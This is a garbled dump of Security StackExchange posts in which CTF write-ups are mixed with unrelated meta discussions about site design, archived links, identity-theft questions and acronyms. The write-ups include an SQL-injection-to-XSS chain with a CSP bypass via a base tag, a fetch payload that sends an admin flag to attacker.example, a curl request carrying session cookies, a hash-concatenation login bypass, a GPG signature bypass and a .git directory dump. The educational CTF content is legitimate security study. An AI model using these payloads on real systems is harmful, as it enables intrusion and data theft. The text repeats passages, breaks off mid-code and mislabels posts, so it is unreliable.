    --cookie ""connect.sid=s%3AYkjGROGerhwE4mzWp_O7zuNy4Rm2r1P_.rEMh%2FeI3LjlMQmglgwP7CDt5j1RVlIJvVZPkwpmEkb8"" \
    --header ""Content-type: application/json"" \
    --data ""{ \
        \""_csrf\"": \""ilkJroTE-mNtLgELBHLjGP8t2WGsI9TFPkq8\"", \
        \""value\"": [\""1::boolean, title='&lt;/script&gt;&lt;base href=http://attacker.example/&gt;' WHERE id = 2597--\""] \
      }"" \
    http://nodepad.hackable.software:3000/notes/2597/pin
</code></pre>

<p>After reporting that note to the admin, it'll leak the HTML content of <code>/admin/flag</code> to our logger and we can extract the flag:</p>

<pre><code>DrgnS{Ar3_Y0u_T3mP14t3d?}
</code></pre>

<hr>

<p><sup>1</sup>Actually, the <code>strict-dynamic</code> directive of the CSP allows already trusted scripts to create additional trusted scripts without having to add a nonce to them. So we could inject a script here right away. However, in this write-up I'm proposing a more fun way to bypass the CSP via a <code>&lt;base&gt;</code> tag.</p>

Also, if you didn't participate in the CTF, I'd encourage you to set up the challenge locally and attempt it yourself first, before reading the write-up.</em></p>

<h2>What's the admin bot doing?</h2>

<p>From looking into the admin bot implementation at <code>/bin/process_reports</code>, we learn that once a note is reported, the admin logs in and visits <code>/admin/${id}</code> where <code>id</code> is the ID of reported note. Clearly, we somehow need to XSS the admin and exfiltrate the flag.</p>

<p>Let's check out <code>routes/admin.js</code>. The flag can apparently be fetched from <code>/admin/flag</code>:</p>

<pre>
router.get('/flag', (req, res) => {
  res.render('index', {notices: [process.env.FLAG]});
});
</pre>

<p>And the admin's note view is essentially the same as any user's note view:</p>

<pre>
router.get('/:noteId(\\d+)', async (req, res) => {
  const notes = await req.db.all `SELECT id, title, content FROM notes WHERE id = ${req.params.noteId}`;
  res.render('notes', {notes});
});
</pre>

<p>So if there's an XSS flaw, it must be triggered here.</p>

<h2>O XSS, where art thou?</h2>

<p>The current notes are fetched as JSON, <code>JSON.stringify</code>'ed and inserted as an inline script:</p>

<pre><code>&lt;script nonce=""78172121522105a149287e6d32966f43""&gt;
  window.notes = [{""id"":2597,""title"":""foo"",""content"":""bar"",""pinned"":true}, ...];
&lt;/script&gt;
</code></pre>

<p>Then, a script (<code>/public/javascripts/notes.js</code>) is inserting the notes into the page. But wait, it's inserting the note title via jQuerys <a href=""https://api.jquery.com/html/#html-htmlString"" rel=""nofollow noreferrer""><code>.html()</code></a> instead of using the safe <code>.text()</code>:</p>

<pre>
function createNote(note) {
  ...
  element.find('.title').html(note.title);
  ...
}
</pre>

<p>So if we could get HTML into a note title, we'd have stored XSS.</p>

<h2>How to get HTML into a note?</h2>

<p>Sadly, the app is testing the title and body of every new note against <code>/[&lt;&gt;]/</code>. So, there's no way to submit a note with angle brackets in it:</p>

<pre><code>router.post('/new', async (req, res) =&gt; {
  const regex = /[&lt;&gt;]/;

  let errors = [];
  if (regex.test(req.body.title)) {
    errors.push('Title is invalid');
  }

  if (regex.test(req.body.content)) {
    errors.push('Content is invalid');
  }

  if (errors.length !== 0) {
    return res.render('new', {errors});

  // [If there are no errors, insert note into DB]
}
</code></pre>

<p>If we can't get HTML into a note regularly, we need an SQL injection...</p>

<h2>Where's the SQLi?</h2>

<p>SQL queries in the app are written as <a href=""https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Template_literals"" rel=""nofollow noreferrer"">template literals</a>, e.g.:</p>

<pre><code>await req.db.run `DELETE FROM notes WHERE user_id = ${req.session.userId} AND id = ${req.params.noteId}`;
</code></pre>

<p>That's an elegant way of protecting against SQL injections. Note that this notation requires no brackets after <code>req.db.run</code>. The way template literals work is that this is essentially calling:</p>

<pre><code>req.db.run(
  [""DELETE FROM notes WHERE user_id = "", "" AND id = "", """"],
  req.session.userId,
  req.params.noteId
)
</code></pre>

<p>Like with <em>prepared statements</em>, you can see that the query is separated from the data. The DB adapter is processing the arguments so that this ends up as the following query:</p>

<pre><code>sql_query(""DELETE FROM notes WHERE user_id =  $1  AND id =  $2"", req.session.userId, req.params.noteId)
</code></pre>

<p>Pretty tamper-proof, eh?</p>

<h2>Pinning down the bug</h2>

<p>Luckily, the query for pinning a note has a subtle bug:</p>

<pre>
router.post('/:noteId(\\d+)/pin', async (req, res) => {
  if (req.body.value && req.body.value.length === 1) {
    const result = await req.db.run(`UPDATE notes SET pinned = ${req.body.value}::boolean WHERE id = ${req.params.noteId}`);
    if (result.error) {
      return res.render('index', {errors: ['An error occurred']});
    }
  }
  ...
});
</pre>

<p><code>req.db.run</code> is called with brackets! This means, it looks like a prepared statement, but it's not. The whole query is turned into a single string before it's passed to <code>db.run</code>. So the app treats it as one single fixed query without any parameters, e.g.:</p>

<pre><code>sql_query(""UPDATE notes SET pinned = 1::boolean WHERE id = 1234"")
</code></pre>

<p>instead of</p>

<pre><code>sql_query(""UPDATE notes SET pinned = $1 ::boolean WHERE id = $2"", req.body.value, req.params.noteId)
</code></pre>

<p>Nice, that's an SQLi! But there's another nasty check. Looking at the pinning function again, we find that it first checks that:</p>

<pre><code>req.body.value &amp;&amp; req.body.value.length === 1
</code></pre>

<p>Looks like we can only SQL-inject a single character - which would be useless.</p>

<h2>Bypassing the length check</h2>

<p>Express apps accept other request content types than just <code>application/x-www-form-urlencoded</code> by default. So maybe we can trick the length check by sending JSON (<code>application/json</code>) instead which will be parsed into a JS object on the server side. These are equivalent:</p>

<pre><code>_csrf=ilkJroTE-mNtLgELBHLjGP8t2WGsI9TFPkq8&amp;value=1
</code></pre>

<p>and</p>

<pre><code>{""_csrf"": ""ilkJroTE-mNtLgELBHLjGP8t2WGsI9TFPkq8"", ""value"": 1}
</code></pre>

<p>Now, a simple trick to pass <code>value.length === 1</code> is by sending an array with one element instead of a string or number:</p>

<pre><code>{""_csrf"": ""ilkJroTE-mNtLgELBHLjGP8t2WGsI9TFPkq8"", ""value"": [""more than one character!""]}
</code></pre>

<p>This way, we can finally construct an SQLi payload. The following payload will insert a script tag into our note title:</p>

<pre><code>1::boolean, title='&lt;script&gt;alert(1)&lt;/script&gt;' WHERE id = 2597--
</code></pre>

<p>which ends up as</p>

<pre><code>UPDATE notes SET pinned = 1::boolean, title='&lt;script&gt;alert()&lt;/script&gt;' WHERE id = 2597-- ::boolean WHERE id = 2597
</code></pre>

<h2>A wild CSP appears</h2>

<p>Not so fast. The app has implemented a CSP which will block all inline scripts unless they are tagged with a dynamic random nonce:</p>

<pre>
Content-Security-Policy:
  default-src 'none';
  <b>script-src 'nonce-78172121522105a149287e6d32966f43' 'strict-dynamic';</b>
  style-src 'self' https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css;
  img-src 'self';
  connect-src 'self';
  frame-src https://www.google.com/recaptcha/;
  form-action 'self';  
</pre>

<p>Our XSS injection point in the title is useless!<sup>1</sup> But there's another one. Remember that the note data is injected in an inline script via <code>JSON.stringify()</code>? <code>JSON.stringify</code> doesn't sanitize angle brackets, so we can inject tags into the HTML <code>&lt;head&gt;</code> of the document, which will look something like this:</p>

<pre><code>&lt;head&gt;
  &lt;script nonce=""78172121522105a149287e6d32966f43""&gt;
    window.notes = [{""id"":2597,""title"":""&lt;/script&gt;[INJECT TAGS HERE]"",""content"":""bar"",""pinned"":true}, ...];
  &lt;/script&gt;
  &lt;script nonce=""78172121522105a149287e6d32966f43"" src=""/javascripts/notes.js""&gt;&lt;/script&gt;
&lt;/head&gt;
</code></pre>

<p>Err... how does that help? We still don't have the random nonce.</p>

<h2>Drop that base</h2>

<p>Notice how the second <code>&lt;script&gt;</code> in the head has a <code>nonce</code> attribute and is a <em>relative</em> URL? We can redirect that script somewhere else by injecting a <a href=""https://developer.mozilla.org/en-US/docs/Web/HTML/Element/base"" rel=""nofollow noreferrer""><code>&lt;base&gt;</code></a> tag before it.</p>

<p>So, if we inject <code>&lt;base href=""http://attacker.example/""&gt;</code> before the relative remote script, the browser will request <code>http://attacker.example/javascripts/notes.js</code> instead, which satisfies the CSP rules.</p>

<p>Our injected <code>notes.js</code> can then just fetch the flag and log it somewhere:</p>

<pre><code>fetch(location.protocol + '//' + location.host + '/admin/flag').then((res) =&gt; {
    res.text().then((text) =&gt; {
        location.href = 'http://attacker.example/log?' + btoa(text);
    });
})
</code></pre>

<p>Now, let's insert that final payload in our note title:</p>

<pre><code>$ curl \
    --cookie ""connect.sid=s%3AYkjGROGerhwE4mzWp_O7zuNy4Rm2r1P_.rEMh%2FeI3LjlMQmglgwP7CDt5j1RVlIJvVZPkwpmEkb8"" \
    --header ""Content-type: application/json"" \
    --data ""{ \
        \""_csrf\"": \""ilkJroTE-mNtLgELBHLjGP8t2WGsI9TFPkq8\"", \
        \""value\"": [\""1::boolean, title='&lt;/script&gt;&lt;base href=http://attacker.example/&gt;' WHERE id = 2597--\""] \
      }"" \
    http://nodepad.hackable.software:3000/notes/2597/pin
</code></pre>

<p>After reporting that note to the admin, it'll leak the HTML content of <code>/admin/flag</code> to our logger and we can extract the flag:</p>

<pre><code>DrgnS{Ar3_Y0u_T3mP14t3d?}
</code></pre>

<hr>

<p><sup>1</sup>Actually, the <code>strict-dynamic</code> directive of the CSP allows already trusted scripts to create additional trusted scripts without having to add a nonce to them. So we could inject a script here right away. However, in this write-up I'm proposing a more fun way to bypass the CSP via a <code>&lt;base&gt;</code> tag.</p>

"Editing misleading question, possibly against authors intention","<p>I'm pretty new to Information Security. When I first joined, I was intrigued by the design, and looked up some of the <a href=""https://security.meta.stackexchange.com/questions/345/design-for-it-security"">history and discussion</a> about it; it was cool.</p>

<p>When I want back on to the site, not knowing that the theme had been changed, I was wondering what those red and blue lines off to the side were for. I didn't know if they were buttons, or just odd decoration, or what. It was only until I clicked on this link that I realized a theme change had been made, and those lonely lines were what were left of a background and theme that used to have much more of a coherent impact.</p>

<p>I have four things to mention:</p>

<ol>
<li><p>The lines off to the side don't look good. They don't make
sense, and they seem out of place.</p></li>
<li><p>By changing the theme, you may have lost some of the meaning of the
symbols. It would be good to make sure that the meaning that is the
most important is still there. Does the lion and shield actually use
the blue lines ""defense"" lines to hold off the ""attacking"" red
lines? Or are the threats of the world just kinda off to the side,
somehow magically being defended?</p></li>
<li><p>The theme no longer seems to carry throughout the site. I know that this is probably how all of the new themes are going to be, but I will really miss feeling like I was on a completely different site when coming to the Information Security page, due to the huge impact the theme had on so much of the page.</p></li>

<p><strong>Pro tip:</strong> Be smarter than me and don't try to brute-force the ZIP file entry offsets for ages. Cause, see that footer? <code>0x59 0x5A</code> is actually the <code>.xz</code> format's stream footer magic bytes. So it appears to be a valid XZ file, just with a ZIP header.</p>

<p>Now since, we don't have the time and energy to read specs, let's just make our own dummy <code>.xz</code>, use its header to replace the ZIP header and hope for the best:</p>

"Editing misleading question, possibly against authors intention","<h2>secure-hash (269, crypto)</h2>

<p>We get a C++ implementation of a register/login system. The auth works as follows:</p>

<p>You can register with a username and password. The app then stores a <code>sha512</code> hash based on the credential pair in a hash table. When logging in, the app calculates a hash of the supplied credentials and looks it up in the table. If found, you're in. The task is to log in with user <code>root</code>, however the app disallows registering with the username <code>root</code>.</p>

<p>Let's see how the hash is calculated:</p>

<pre><code>std::string sha512sum(const std::string&amp; name, const std::string&amp; password) {
        EVP_MD_CTX *mdctx;
        const EVP_MD *md;
        unsigned char md_value[EVP_MAX_MD_SIZE];
        unsigned int md_len;

        mdctx = EVP_CREATE_FN();
        md = EVP_get_digestbyname(""sha512"");
        EVP_MD_CTX_init(mdctx);
        EVP_DigestInit_ex(mdctx, md, NULL);
        EVP_DigestUpdate(mdctx, name.c_str(), name.size());
        EVP_DigestUpdate(mdctx, password.c_str(), password.size());
        EVP_DigestFinal_ex(mdctx, md_value, &amp;md_len);
        EVP_DESTROY_FN(mdctx);

        return std::string(reinterpret_cast&lt;char*&gt;(md_value), md_len);
}
</code></pre>

<p>So, username and password are supplied via <code>EVP_DigestUpdate()</code>. Under the hood, that's simply a concatenation of the given values until the hash is produced with <code>EVP_DigestFinal_ex()</code>. So we simply need to find <code>a, b, c</code> with <code>a != ""root""</code> so that <code>sha512(a || b) == sha512(""root"" || c)</code>.</p>

<p>That would be satisfied by <code>a=""roo"", b=""tX"", c=""X""</code>. Let's do it:</p>

<pre><code>$ nc secure-hash.ctf.hackover.de 1337
Main menu:
1 - Register new user

"Editing misleading question, possibly against authors intention","<h2>military-crypto (pwn, 430)</h2>

<p>This server app allows users to run, update and download a specific ""firmware""
which is a basically GPG-signed bash script. Whenever you want to upload a new
firmware, you supply the firmware image (bash file <code>firmware.bin</code>) and detached
signature file (<code>firmware.bin.sig</code>) which the server then verifies. So, our goal here
is to modify the bash script to inject our own code while passing the signature
verification.</p>

<p>Let's look at the verification part:</p>

<pre><code>if ! gpg --verify update.bin.sig; then
    set +x
    echo '!!!!!!!!!!!!!!!!!!!!!!!'
    echo '!! INVALID SIGNATURE !!'
    echo '!!!!!!!!!!!!!!!!!!!!!!!'
    exit 1
else
    chmod +x update.bin
    echo 'Updating....'
    ./update.bin
    echo 'Rebooting....'
    exit 0
fi
</code></pre>

<p>The condition <code>if ! gpg --verify update.bin.sig</code> means the script fails if <code>gpp --verify update.bin.sig</code> returns an exit code other than 0, that is, has a failure of any kind.</p>

<p>The problem with that command is that a lot of what GPG does here is implicit: GPG reads <code>update.bin.sig</code>, sees that it's a detached signature, looks at its filename and concludes that it's supposed to sign <code>update.bin</code> which it then verifies. Another observation is that <code>update.bin</code> has an included ASCII-armored signature in itself:</p>

<p>So what if we feed that whole firmware file as the <code>.sig</code>? Since it has an ASCII-armored signature included, GPG will detect the included signature and verify the file by itself without even looking at the original firmware!</p>

<pre><code>#!/bin/bash

<pre><code>$ rm update.bin.sig &amp;&amp; cp update.bin update.bin.sig

<p>Now, put <code>echo $(cat /home/ctf/flag.txt)</code> somewhere into <code>update.bin</code> so that the patched firmware outputs the flag. And finally, run it:</p>

<p>We get a very basic web app that hosts some text files. Clicking on them in the browser doesn't get us anywhere (later, we'll find out that this is because the app detects and disallows referrers). So, let's use <code>curl</code>:</p>

<p>Important things we find in that web server implementation are:</p>

<ul>
<li>Paths can't start with <code>.</code></li>
<li>Paths can't end with <code>/</code></li>
<li>There is a restriction for a path with <code>path.startswith('flag.git') or search('\\w+/flag.git', path)</code></li>
</ul>

<p>So it looks like we need to get into that <code>flag.git/</code> dir!</p>

HTTP/1.1 403 U NO POWER
</code></pre>

<p>Uh-oh, access denied! But we can simply bypass that <code>\w+/flag.git</code> regex. because putting a <code>./</code> inside the path doesn't change the location but a <code>.</code> doesn't match <code>\w</code>:</p>

<pre><code>$ echo ""GET //home/ctf/./flag.git HTTP/1.1\n"" | nc cyberware.ctf.hackover.de 1337 | head -n 1
HTTP/1.1 406 Cyberdir not accaptable
</code></pre>

<p>Well, no directory listing. But the <code>.git</code> ending seems to indicate it's a git meta directory. So, let's try to extract some common files you may find in a <code>.git/</code> dir:</p>

<p>File <code>/flag.git/HEAD</code>:</p>

<pre><code>ref: refs/heads/master
</code></pre>

<p>File <code>/flag.git/refs/heads/master</code>:</p>

<pre><code>b69c0fc2567dc2d0e59c6e6a10c7e5afd3013b6a
</code></pre>

<p>Now, we can't just extract all git objects without knowing their locations, but we just discovered an object hash, so we <em>should</em> be able to download it.</p>

<pre><code>$ echo ""GET //home/ctf/./flag.git/objects/b6/9c0fc2567dc2d0e59c6e6a10c7e5afd3013b6a HTTP/1.1\n"" | nc cyberware.ctf.hackover.de 1337 | head -n 1

</code></pre>

<p>Okay, so they deleted a file called <code>ups</code>, so we can't locate that either. But there's another mechanism for git to store objects -- <a href=""https://git-scm.com/book/en/v2/Git-Internals-Packfiles"" rel=""nofollow noreferrer"">packfiles</a>! Packfiles are a great feature because compressing (and storing only diffs instead of all file versions) helps git to keep the footprint small. Let's see if there are any packs:</p>

<p>File <code>/flag.git/objects/info/packs</code>:</p>

<pre><code>P pack-1be7d7690af62baab265b9441c4c40c8a26a8ba5.pack
</code></pre>

<p>Nice, there's a packfile and we can conclude where it's located, so we can download the <code>.pack</code> and the corresponding index file:</p>

<pre><code>/flag.git/objects/pack/pack-1be7d7690af62baab265b9441c4c40c8a26a8ba5.pack
/flag.git/objects/pack/pack-1be7d7690af62baab265b9441c4c40c8a26a8ba5.idx
</code></pre>

<p>But since they aren't plaintext we can't just read them. So let's make a dummy repo for them:</p>

<pre><code>$ mkdir /tmp/foo
$ cd /tmp/foo
/tmp/foo $ git init
</code></pre>

<p>Copy the downloaded packfiles into it:</p>

<pre><code>/tmp/foo $ cp ~/downloads/pack.pack ~/downloads/pack.idx .git/objects/pack
</code></pre>

<p>Now, of course, the indexing etc. in our dummy repo is all messed up, so let's just use the tool <a href=""https://git-repair.branchable.com/"" rel=""nofollow noreferrer""><code>git-repair</code></a> to fix all those references.</p>

<pre><code>/tmp/foo $ git-repair
Running git fsck ...
Unpacking all pack files.
Unpacking objects: 100% (15/15), done.

Successfully recovered repository!
You should run ""git fsck"" to make sure, but it looks like everything was recovered ok.
</code></pre>

<p>Let's verify:</p>

<pre><code>/tmp/foo $ git fsck

notice: HEAD points to an unborn branch (master)
Checking object directories: 100% (256/256), done.

<p>For example, if you need incident response support (your server has been compromised and you need to identify what data they may have accessed for reporting to the regulator), you need a very different skill set to getting a vulnerability scan of your network of 10,000 PCs, or when you need a threat model for your new fintech startup, or when you need your AES integration verified.

<p>In the original banner the Lion was defending against the red lines using the blue lines, which made sense. These lines were both understated as well as fundamental to the design.

Should we use archived links instead of direct links?,"<p>I was the author of the answer with the archived link. In <em>general</em> I think that no, we should not provide archived links. I only used the archive for this specific link because, in my experience, The Daily Dot often deletes or modifies articles, making them invalid for future reference. Using an archive ensures that people are able to see what was present when the article was first linked, not anything else.</p>
<blockquote>
<p>The problem with this approach is that when the original link stops working we can find an archive link using the original and replace it. But if the archive link stops working we will not be able to trace back the original link from it (<a href=""https://archive.fo/QGtny"" rel=""nofollow noreferrer"">https://archive.fo/QGtny</a>) and the reference will be gone forever.</p>

<blockquote>
<p>Should we prefer original links to archives? (And create a snapshot in archive maybe).</p>
</blockquote>
<p>Generally yes. As for creating a snapshot in the archive, I actually do that for almost all the links I post unless they are reproductions of redundant data like man pages, source code, or are on a site that is regularly archived already, like Wikipedia or Stack Exchange.</p>

Can you help me rephrase my question?,"<p>This is <em>your</em> question, you need to define the problem that the question is addressing. All I have asked is that you connect the dots. If I didn't want to help you, I would have just closed the question without comment. </p>

<p>Work with me: what is it that you want to fix? Destroyed lives? Do you want to lessen the impact of stolen identities? Prevent someone getting their hands on a physical driver's license? Prevent someone from being able to use public data to impersonate another? Do you want to fix unauthorised access to data or using the data? What do you mean by ""identity theft"", because there are many different forms? Physical or digital theft? </p>

<p>Can you see that there are numerous facets? And your question makes no attempt to define the problem space. </p>

<p>The problem that you have described in your edits and your comments is akin to asking how to prevent all theft of all types. I'm not calling you stupid, I'm saying that you have not thought the question through at all or even defined your terms. You appear to see a desired end state and you want to know a path, but you have not started at the beginning or even which direction you want to head. </p>

<p>There <em>are</em> viable solutions that are being tested but not implemented yet. Many different countries have taken many different approaches to protect national identifiers. But they are all trying to protect different aspects.</p>

<p>So, what problem do you want fixed?</p>

Can you help me rephrase my question?,"<p>First off, I do agree with you that the comments left by the moderator were uncalled for and excessively belittling, but I also agree with the moderator that the question is vague and a bit too broad. The problem is that topics like this <em>are</em> complex. So complex in fact that we have multiple competing organizations all over the world simultaneously working on the problem. The thing is, identity theft is often performed by very skilled, motivated, numerous, and persistent attackers. ""Defeating"" identity theft is like ""defeating"" disease. It's just not possible. We can mitigate it, sure. We can treat the symptoms, and we can reduce the risk to acceptable levels, but completely mitigating it can't be done.</p>

<p>For example, concentrating all national identity information in one or a few places has lead to massive breaches of privacy, such as in the Equifax breach. You see there how companies designed to protect identities ends up revealing vast amounts of personal information to many people. You then suggest some kind of authentication. How would that work? People are dumb, so no matter what secret you use to authenticate them formally to the government, that secret will be given out as soon as an official-looking letter is sent to them by a scammer warning them that they need to provide the information or risk having their bank account shut down. Even biometric authentication can be fooled.</p>

<p>The end result is that you are asking a question that is effectively as broad as ""why can't we just stop crime?"", providing solutions like ""maybe it's hard to do"" or ""maybe there are a lot of differing opinions"". The fact is, it's just too vast of a topic to fit on a site that not only wants narrow topics, but wants a <em>clearly defined</em> threat model specifying adversarial capabilities, assets, etc.</p>

<hr>

<p>Now, since you did ask how to improve your question, I can offer a few suggestions. For a question to be answerable by information security experts, you need to specify a number of things:</p>

<ul>
<li><p>How do you define <em>identity theft</em>? It's a broad term meaning many things.</p></li>
<li><p>What do you mean by stopping it? Do you want the occurrences to go to 0?</p></li>
<li><p>What level of identity theft is acceptable to you? What factors does this depend on?</p></li>
<li><p>What assets do you want protected? SSN? CC? Mother's maiden name?</p></li>
<li><p>How much lost value do you place on each case of theft (however you define it)?</p></li>
<li><p>How many resources do you think should be put into ""stopping"" it?</p></li>
</ul>

<p>This isn't even an exhaustive list, but you need to provide this kind of information if you want such an incredibly broad question to be answered, because it <em>is</em> incredibly broad. Let me put it this way: There are brilliant people whose living is finding ways to reduce the impact of identity theft, and there are brilliant people whose living is finding ways to steal identities and profit from it. This complex interaction, combined with massive geopolitical variables, results in a problem so complex than any question relating to that problem needs to either be extremely specific, or contain a huge amount of detail.</p>

<p>What should your question end up looking like? Probably something like <a href=""https://security.stackexchange.com/q/76525/165253"">this</a>. That question starts by distinguishing the two kinds of identity theft that are in scope and specifies the assets that need protecting, identifies a very specific and very narrow circumstance (key signing parties), provides two suggested mitigations to reduce the occurrence of identity theft, and mentions potential problems in the form of trade offs with the suggested mitigations. It concludes by asking how one can mitigate the threat while reaping the most benefit from the dangerous situation they are in.</p>

Can you help me rephrase my question?,"<p>Yes, it is that hard to understand what you are getting at.</p>

<p>You compare stealing a Gmail account with stealing an identity. I know what a Gmail account is. I don't know what an ""identity"" is. Identity theft is a very broad term with multiple vague meannings that differ between jurisdictions. To make the question answerable, you need to specify exactly what kind of attack you are concerned with.</p>

What is the best practice for acronym usage in Questions/Answers/Comments?,"<p>The model I have been using is based on the fact that this is a site for Information Security professionals (yes, not only them, but that's the basis). If an acronym is within the standard Body of Knowledge of an Information Security professional, then we need not expand for the community. </p>

<p>Or if the acronym is used so ubiquitously that the acronym is understood without the underlying words, then it need not be expanded. I would argue that ""CVE"" is understood by itself without needing to understand what it stands for (I'm not sure that I could tell you what the ""E"" stands for from one day to the next).</p>

<p>That's not to say that if someone uneducated in security asked a question that we should not expand the acronyms. We should help were we can. <strong>But I would hope that someone in the security community would look up acronyms in relation to a discussion around a security topic they are interested in.</strong> I do not feel the need to expand an acronym for someone in that context. <strong>Especially if the acronym is explained in the tag.</strong> </p>

<p>I think the best general approach is to <strong>use tags to handle acronym explanations</strong>. That's what they are there for. In cases where there are more acronyms than the tag field can accommodate, I think the above model is useful.</p>

How do I self close vote on my own question?,"<p>I'm normally the first person to complain about moderator abuse, but the moderators on this site are honestly very good. They weren't ""punishing you"", just deleting an answer. This is not uncommon on Stack Exchange. In fact, it is expected. Think of it more like Wikipedia, where it is a collection of useful knowledge rather than a bunch of privately-owned posts. If an answer needs editing, a moderator or even someone random will edit it. If an answer is not appropriate for whatever reason, a moderator can delete it. It's not an attack against <em>you</em>, and while I am not a mind reader, I am pretty sure that none of the moderators here are <em>mad</em> at you. They deal with this every day in the constant battle to ensure quality.</p>

<p>Your responses have been pretty aggressive from what I've seen, and I don't blame you. You were likely under the belief that, like many social media sites, posts are only deleted under extreme circumstances and only when the poster has done something <em>really bad</em>. That is not the case here. We have a very high standard for answers and, even if your answer may have been totally acceptable elsewhere, it wasn't acceptable here. Many new users go through the process of submitting a question or answer and having it closed or deleted, and that's not a bad thing. Just learn from it; no one will hold anything against you!</p>

Are there any Review audits?,"<p>This is a classic argument about security vulnerabilities: ""Should we show everyone this vulnerability in this bit of software - then the bad guys will know how to use it!""</p>

<p>It may not surprise you that this discussion has been around since at least 1785 when Joseph Bramah, an inventor from Yorkshire, released a book called 'A Dissertation on the Construction of Locks' where he exposed the weaknesses of current (at the time) 'thief-proof locks'.</p>

<p>His central tenet was that thieves (and locksmiths) knew the weaknesses of locks anyway, whereas the general public (who were buying the locks) did not: his belief was that if the public was educated about such matters, they would be better able to protect themselves by bringing their knowledge up to the level of miscreants and professionals and thus be able to choose a better lock.</p>

<p>(It may also not surprise you that after exposing the weaknesses of another company's lock, he brought his own lock to market.

<p>I firmly believe that this has parallels in today's software heavy society: vulnerabilities should be openly discussed so that a general user may be made aware of any potential issues (that criminals and professionals are likely to know about anyway), and thus educated, can make better choices to protect themselves.</p>

<p>Personally, I think that niche tags are not a problem. They are usually for a specific product or piece of software and hence very clearly defined.

<li>Are iPhones secure?</li>

<li>Is an exploit that requires administrative privileges to work dangerous?</li>
<li>Why do hackers use automated tools?</li>
<li>If an account can be freely created by anyone, does an exploit still technically ""require privileges""?</li>
</ul>

<p>All of these questions have some degree of subjectiveness, in the sense that there is no clear-cut yes/no line, but they inspire factual answers and a deeper understanding of the subject, rather than an ""any answer is valid""-approach.</p>

<ul>

<p>My guess is that the proposed new site would fare much better with such questions than this site because it would be obvious to everyone that it would be about physical security so it would be better able to attract questions about the topic as well as experts able to answer them.</p>

<li>Make physical security questions off-topic here, <strong>but</strong></li>
<li>Set up a new site: <code>physicalsecurity.stackexchange.com</code> that will be especially about questions about physical security.</li>
</ul>

<p>My guess is that the proposed new site would fare much better with such questions than this site because it would be obvious to everyone that it would be about physical security so it would be better able to attract questions about the topic as well as experts able to answer them.</p>

<p>Also the proposed new site would be better able to avoid topic inconsistencies like these:</p>

<blockquote>
  <p>But the questions have to at least tangentially be related to physically securing information. Design decisions for locks are probably out.</p>
</blockquote>

<p>This doesn't seem intuitive - once <a href=""https://security.stackexchange.com/questions/216591/what-is-the-purpose-of-the-rotating-plate-in-front-of-the-lock"">questions about the purpose of certain parts of locks</a> are allowed, why are design decisions not allowed? Both topics seem just too close to each other for me.</p>

<p>Unlike this site, however, the proposed new site would be able to fully cover the topic of physical security.</p>

How should major revisions of answers been dealt with?,"<p>Create a second answer.  There is nothing wrong with submitting more than one answer to the same question, if they take fundamentally different approaches with no broad overlap or commonality.  Then, the OP could choose one or the other approach.  I have rarely done this, but I have done at least once (edit: on StackOverflow)</p>

<p>If your old answer is technically incorrect, then generally I'd try to salvage it if possible by fixing it up, but if it's so fundamentally wrong that you couldn't make it correct without changing its direction fundamentally, I'd just delete it and work on the new answer instead.</p>

<p>At time of writing this, you replaced your old answer with some placeholder text saying the answer that had been there was not correct.  I can see the intention behind this, but it's left an ""answer"" that isn't actually an answer, which will need to be deleted.</p>

"Canonically, are there any security concerns with this system?","<h1>Question title:</h1>

<p>I created a complex system. Are there any security concerns with it?</p>

<h1>Question Body:</h1>

<p>This is a canonical question to help people who have created a process, application, procedure, algorithm, etc., to keep their systems secure and who are looking for feedback.</p>

<p>If someone marked your question as a possible duplicate of this question, then you're on the right track. You have thought long and hard about an issue, and have considered some of the security implications.  However, due to the unique nature of both StackExchange and of the Information Security SE site, you're unlikely to get an in-depth answer.</p>

<p>This does not mean that your question is done, unless your question has also been put on hold.</p>

<p>If someone has insight into the type of system that you're developing, and they know of a better way to accomplish what you're seeking, they may still leave answers (and are encouraged to do so).  It typically takes time for questions to be put on hold, unless they're obviously off topic, so breathe easy and read the answer(s) here.</p>

<p>This is different from most canonical questions throughout StackExchange, as there isn't really a single example of this question, and it doesn't neatly fit into any one tag. Rather, it covers a whole class of questions across a broad range of topics.</p>

<h1>Answer 1:</h1>

<blockquote>
  <p>I created a complex system. Are there any security concerns with it?</p>
</blockquote>

<p>From the perspective of this site, there are two answers:</p>

<ul>
<li>Yes.</li>
<li>Probably.</li>
</ul>

<p>If we know that there is security issue, we'll tell you.  You'll either get a helpful comment or a full fledged answer soon.</p>

<p>For example, if you have UserIDs encoded in a cookie, and you want input on a way that you created to further obfuscate that UserID, we'll tell you to use a nonce instead of using the UserID.</p>

<p>If, however, we don't know of a better way to accomplish what you're seeking, then the answer changes from <em>yes, it is insecure</em> to <em>it is probably insecure, but we don't know enough to provide insight.</em></p>

<p>Let's break that apart:</p>

<p><strong>Your system is probably insecure.</strong></p>

<p>This isn't meant to discourage you. It is only meant to warn you to be careful.</p>

<p>You have already taken the first step in creating a more secure system: you have identified a potential way for your system to be exploited, and you cared enough about it to take it seriously.</p>

<p>However, seasoned professionals in the field also create insecure systems.  These professionals may do it less frequently than the rest of us, but it happens, and often with dramatic results.  (See also: Heartbleed, Rowhammer...)</p>

<p>When you do your risk assessment, assume that the attacker knows everything that you do, and probably more.  If you can afford to lose all of your data (and if you have customers, then all of the trust of your customers), then keep playing; it will be a great learning experience.</p>

<p>Just never try to roll your own security in a real-world environment; trust the tried-and-true security best practices.</p>

<p>Remember <a href=""https://www.schneier.com/blog/archives/2011/04/schneiers_law.html"" rel=""nofollow noreferrer"">Schneier's Law</a></p>

<p>Original:</p>

<blockquote>
  <p>Anyone, from the most clueless amateur to the best cryptographer, can create an algorithm that he himself can't break. It's not even hard. What is hard is creating an algorithm that no one else can break, even after years of analysis. And the only way to prove that is to subject the algorithm to years of analysis by the best cryptographers around.</p>
</blockquote>

<p>2006 version:</p>

<blockquote>
  <p>Anyone can invent a security system that he himself cannot break. I've said this so often that Cory Doctorow has named it ""Schneier's Law"": When someone hands you a security system and says, ""I believe this is secure,"" the first thing you have to ask is, ""Who the hell are you?"" Show me what you've broken to demonstrate that your assertion of the system's security means something.</p>
</blockquote>

<p>Even if Bruce Schneier came here himself and asked ""is this insecure?"" my first answer would be ""Probably,"" and I'm nowhere near qualified to evaluate any system that Schneier creates.  This is mainly because any serious system Schneier would post would be submitted to a journal first, and not here, but that's context specific.  <em>Anyone</em> coming here to ask if a system is secure will have a ""probably"" answer by default, until it is proven that yes, it is insecure.</p>

